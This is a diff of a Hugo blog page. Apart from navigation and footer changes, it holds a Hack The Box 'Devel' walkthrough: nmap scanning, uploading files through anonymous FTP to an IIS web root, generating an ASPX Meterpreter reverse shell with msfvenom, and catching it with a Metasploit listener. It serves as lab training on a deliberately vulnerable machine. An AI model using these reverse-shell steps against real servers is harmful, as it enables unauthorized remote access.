@@ -151,7 +151,15 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://joshuakrizek.com/posts/blue/">Blue</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://joshuakrizek.com/posts/devel_htb_pt1/">Devel_HTB_PT1</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://joshuakrizek.com/posts/automate-hugo-with-github-actions/">Automate_Hugo_with_Github_Actions</a>
                             </li>
                         
                             <li class="bullet">
@@ -160,14 +168,6 @@
                         
                             <li class="bullet">
                                 <a href="https://joshuakrizek.com/posts/hugoonwindows/">Installing Hugo on Windows</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://joshuakrizek.com/posts/1-24-2022-post/">Interesting hacking attempt</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://joshuakrizek.com/posts/my-first-post/">My First Post</a>
                             </li>
                         
                     
@@ -203,7 +203,7 @@
         <p class="footnote">
 powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
     <br>
-    &copy; 2023 Joshua Krizek. All rights reserved.
+    &copy; 2025 Joshua Krizek. All rights reserved.
 </p>
 
   </div>
@@ -228,27 +228,26 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 
   <p><a href="https://app.hackthebox.com/machines/Devel">https://app.hackthebox.com/machines/Devel</a></p>
 <p>Step one: ping host to make sure it&rsquo;s active:
-<code>ping 10.10.10.5</code>
-<img src="../../20230516174407.png" alt="1">
-Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
+<code>ping 10.10.10.5</code></p>
+<p>Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
 <code>nmap -v -A -p- 10.10.10.5</code>
-<img src="../../20230516175101.png" alt="1">
-<img src="../../20230516175119.png" alt="3img"></p>
+![[Pasted image 20230516175101.png]]
+![[Pasted image 20230516175119.png]]</p>
 <p>So we know there are two services we can start with, anonymous ftp and a windows server on port 80 with option TRACE. It looks like the ftp share is actually in the root of the IIS web server:
-<img src="../../20230521185353.png" alt="img2"></p>
+![[Pasted image 20230521185353.png]]</p>
 <p>Based on that information let&rsquo;s see if we can upload a file and access it via our browser. Let&rsquo;s try a image. I&rsquo;m going to download a random one:
-<img src="../../20230521185544.png" alt="3"></p>
+![[Pasted image 20230521185544.png]]</p>
 <p>I&rsquo;m going to upload:
-<img src="../../20230521185720.png" alt="img4"></p>
+![[Pasted image 20230521185720.png]]</p>
 <p>Testing failed. Note, downloading the image from the ftp server and trying to open also fails.
-<img src="../../20230521185805.png" alt="img5"></p>
+![[Pasted image 20230521185805.png]]</p>
 <p>Let&rsquo;s try a text file:
-<img src="../../20230521192359.png" alt="img 6">
+![[Pasted image 20230521192359.png]]
 That worked!
-![img 7](/Pasted image 20230521185947.png)</p>
+![[Pasted image 20230521185947.png]]</p>
 <p>Now it&rsquo;s time to create a reverse shell. Based on what we already saw it needs to be ASPX since it&rsquo;s in an IIS site.</p>
 <p>Execute the following command to create the reverse shell:
-<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx &gt; reverse.aspx </code>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx &gt; reverse.aspx </code>
 Upload it to the ftp share:
 <code>put reverse.aspx</code></p>
 <p>Start a listener to listen for the remote connection. Will be using metasploit at this point.
@@ -258,7 +257,7 @@ Upload it to the ftp share:
 <code>set LHOST tun0</code>
 <code>run</code></p>
 <p>Now navigate to that file in the browser and a connection should be opened.
-<img src="../../20230521192307.png" alt="img 8"></p>
+![[Pasted image 20230521192307.png]]</p>
 <p>Inspired from the Windows Privilege Escalation course from TCM Security</p>
 
   <hr>
@@ -266,10 +265,14 @@ Upload it to the ftp share:
     
 	    
             
-	            <a class="previous-post" href="https://joshuakrizek.com/posts/new_hugo_post/?ref=footer">« New hugo post</a>
+	            <a class="previous-post" href="https://joshuakrizek.com/posts/automate-hugo-with-github-actions/?ref=footer">« Automate_Hugo_with_Github_Actions</a>
 	        
         
 	    
+            
+	            <a class="next-post" href="https://joshuakrizek.com/posts/blue/?ref=footer">Blue »</a>
+	        
+        
     
 </div>
 
